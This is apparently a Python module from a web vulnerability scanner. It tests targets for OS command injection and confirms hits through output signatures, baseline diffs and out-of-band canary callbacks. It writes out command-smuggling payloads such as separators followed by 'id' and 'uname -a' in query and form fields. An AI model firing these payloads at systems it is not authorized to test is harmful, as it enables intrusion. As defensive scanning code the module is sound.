"""
OS Command Injection Probe (Architecture §5.2, §17 — evidence-based validation).

A real arsenal module closing the platform's command-injection coverage gap.
It delivers non-destructive command-separator payloads across query AND body
vectors, then confirms via deterministic command-output signatures combined with
a differential vs the baseline response (>= 2 independent signals, never a bare
substring match).
"""

from __future__ import annotations

import re
import urllib.parse

from backend.core.base import BaseArsenalModule
from backend.core.protocol import JobPacket, TaskTarget, Vulnerability
from backend.core.verification import (
    negative_proof_check,
    entropy_delta,
    side_channel_analysis,
    generate_stochastic_cmdi_probe,
    calculate_final_confidence,
    verify_semantic_uniqueness,
    generate_oob_exfil_payloads,
)

# Module-level canary reference (set by orchestrator before scan)
_canary = None
_oob_tokens: list[str] = []


def set_canary(canary) -> None:
    """Set the canary receiver for OOB verification."""
    global _canary, _oob_tokens
    _canary = canary
    _oob_tokens = []


def clear_canary() -> None:
    """Reset canary state after a scan."""
    global _canary, _oob_tokens
    _canary = None
    _oob_tokens = []

# Non-destructive proof commands. Separators cover Linux + Windows shells; the
# commands are read-only identity/echo probes (no state change), per §9 safety.
_SEPARATORS = (";", "&&", "|", "%0a", "&")
_PROBE_CMDS = ("id", "uname -a", "whoami", "echo VIGIL$((7*7))ECHO")

# Deterministic command-output signatures (proof a shell actually ran).
_CMD_OUTPUT_MARKERS = (
    re.compile(r"uid=\d+\([a-z_][a-z0-9_-]*\)"),  # id (Linux)
    re.compile(r"Linux \S+ \S+"),  # uname -a (Linux)
    re.compile(r"VIGIL49ECHO"),  # echo $((7*7)) arithmetic
    re.compile(r"(?i)\b[a-z]:\\\\(windows|users)\b"),  # Windows path echo
    re.compile(r"(?i)\bnt authority\\\\system\b"),  # Windows whoami
)


class CommandInjectionProbe(BaseArsenalModule):
    def __init__(self):
        super().__init__()
        self.name = "OS Command Injection Probe"

    def _inject_query(self, url: str, headers: dict) -> list[TaskTarget]:
        targets: list[TaskTarget] = []
        if "?" not in url:
            return targets
        base, query = url.split("?", 1)
        params = urllib.parse.parse_qs(query, keep_blank_values=True)
        for param, values in params.items():
            base_val = values[0] if values else ""
            for sep in _SEPARATORS:
                for cmd in _PROBE_CMDS:
                    mutated = dict(params)
                    mutated[param] = [f"{base_val}{sep} {cmd}"]
                    targets.append(
                        TaskTarget(
                            url=f"{base}?{urllib.parse.urlencode(mutated, doseq=True)}",
                            method="GET",
                            headers=dict(headers),
                        )
                    )
        return targets

    async def generate_payloads(self, packet: JobPacket) -> list[TaskTarget]:
        url = packet.target.url
        headers = dict(packet.target.headers or {})
        targets: list[TaskTarget] = []

        # Baseline first (unmodified) so the analyzer can diff against it.
        targets.append(
            TaskTarget(url=url, method=packet.target.method or "GET", headers=headers, payload=packet.target.payload)
        )

        # Method 11: Stochastic payload — randomized marker proves shell execution
        stochastic_payload, stochastic_marker = generate_stochastic_cmdi_probe()
        sep = "&" if "?" in url else "?"
        targets.append(
            TaskTarget(
                url=f"{url}{sep}cmd={urllib.parse.quote(f'127.0.0.1; {stochastic_payload}')}",
                method="GET",
                headers=dict(headers),
            )
        )

        # Method 5: Semantic marker payloads for deterministic proof
        try:
            from backend.core.verification import generate_semantic_marker_payloads
            markers = generate_semantic_marker_payloads()
            for payload, expected in markers.get("CMDI", []):
                for sep in _SEPARATORS[:3]:
                    targets.append(
                        TaskTarget(
                            url=f"{url}?cmd={urllib.parse.quote(f'127.0.0.1{sep} {payload}')}",
                            method="GET",
                            headers=dict(headers),
                        )
                    )
        except Exception:
            pass

        # Method 20: OOB exfiltration payloads (canary-backed)
        if _canary and hasattr(_canary, 'generate_token') and len(_oob_tokens) < 50:
            try:
                oob_token = _canary.generate_token()
                _oob_tokens.append(oob_token)
                oob_domain = _canary.base_url.replace("http://", "").replace("https://", "")
                for oob_payload, _oob_path in generate_oob_exfil_payloads(oob_domain, oob_token, "CMDI"):
                    for sep in _SEPARATORS[:3]:
                        targets.append(
                            TaskTarget(
                                url=f"{url}?cmd={urllib.parse.quote(f'127.0.0.1{sep} {oob_payload}')}",
                                method="GET",
                                headers=dict(headers),
                            )
                        )
            except Exception:
                pass

        # Query-vector injection.
        targets.extend(self._inject_query(url, headers))

        # Body-vector injection (form fields) — covers DVWA's exec `ip` field
        # and generic command params. Sends application/x-www-form-urlencoded.
        body_fields = ("ip", "host", "cmd", "command", "address", "target", "domain")
        form_headers = dict(headers)
        form_headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
        seed = packet.target.payload if isinstance(packet.target.payload, dict) else {}
        for field in body_fields:
            for sep in _SEPARATORS[:3]:
                body = dict(seed)
                body[field] = f"127.0.0.1{sep} id; uname -a"
                body.setdefault("Submit", "Submit")
                targets.append(TaskTarget(url=url, method="POST", headers=form_headers, payload=body))
        return targets

    async def analyze_responses(
        self, interactions: list[tuple[TaskTarget, str]], packet: JobPacket
    ) -> list[Vulnerability]:
        """Confirm command injection: a command-output signature must appear AND
        the response must differ materially from the baseline (Architecture §17,
        >= 2 independent signals). Baseline is interaction[0]."""
        from backend.modules.evidence import differential

        vulns: list[Vulnerability] = []
        if not interactions:
            return vulns
        _baseline_target, baseline_text = interactions[0]
        baseline_text = baseline_text if isinstance(baseline_text, str) else ""

        seen: set[str] = set()
        for idx, (target, text) in enumerate(interactions):
            if idx == 0 or not isinstance(text, str) or not text:
                continue
            matched = next((p.pattern for p in _CMD_OUTPUT_MARKERS if p.search(text)), None)
            if not matched:
                continue
            # Signature alone could be reflected; require the baseline to NOT
            # carry it, i.e. the command output is genuinely new (differential).
            baseline_has = any(p.search(baseline_text) for p in _CMD_OUTPUT_MARKERS)
            ev = differential(baseline_text, text)
            confirmed = (not baseline_has) and (ev.signals >= 1 or ev.verified)
            key = f"{target.method}:{target.url}"
            if confirmed and key not in seen:
                seen.add(key)
                vector = "body" if target.method == "POST" else "query"

                signals: list[str] = ["cmd_output_signature"]

                # Method 11: Check for stochastic marker (random value proves shell ran)
                for marker_match in re.finditer(r'VIGIL(\d+)END', text):
                    signals.append("stochastic_marker")
                    break

                # Method 5: Semantic marker verification
                try:
                    from backend.core.verification import generate_semantic_marker_payloads
                    markers = generate_semantic_marker_payloads()
                    for payload, expected in markers.get("CMDI", []):
                        if expected:
                            is_unique, _ = verify_semantic_uniqueness(text, baseline_text, expected)
                            if is_unique:
                                signals.append("semantic_marker")
                                break
                except Exception:
                    pass

                # Method 3: Negative proof
                is_genuine, neg_reasons = negative_proof_check(text, baseline_text, "CMDI")

                # Method 14: Entropy analysis
                ent_d = entropy_delta(baseline_text, text)
                if abs(ent_d) > 0.5:
                    signals.append("entropy_change")

                # Method 9: Side-channel
                sc_ok, sc_desc = side_channel_analysis(200, len(baseline_text), 200, len(text), "CMDI")
                if sc_ok:
                    signals.append("side_channel")

                # Method 20: OOB canary callback verification
                if _canary and _oob_tokens:
                    try:
                        for oob_tok in _oob_tokens:
                            if _canary.check_token(oob_tok):
                                signals.append("oob_canary_callback")
                                break
                    except Exception:
                        pass

                confidence = calculate_final_confidence(
                    base_confidence=0.85,
                    has_negative_proof_pass=is_genuine,
                    has_semantic_marker="semantic_marker" in signals or "stochastic_marker" in signals,
                    has_side_channel="side_channel" in signals,
                    has_entropy_signal="entropy_change" in signals,
                )

                vulns.append(
                    Vulnerability(
                        name="OS Command Injection",
                        severity="CRITICAL",
                        description=(
                            "Injected shell command output was reflected in the response, "
                            "proving server-side command execution. "
                            f"Signals: {', '.join(signals)}."
                        ),
                        evidence=(
                            f"Target: {target.url} (vector={vector})\nCommand-output signature: {matched}; {ev.summary}\n"
                            f"Verification: {', '.join(signals)}"
                        ),
                        remediation=(
                            "Never pass user input to a shell. Use allowlists and native "
                            "language APIs; if a shell is unavoidable, use strict argument "
                            "escaping and parameterization."
                        ),
                        confidence=confidence,
                    )
                )
                break  # one confirmed RCE is decisive
        return vulns
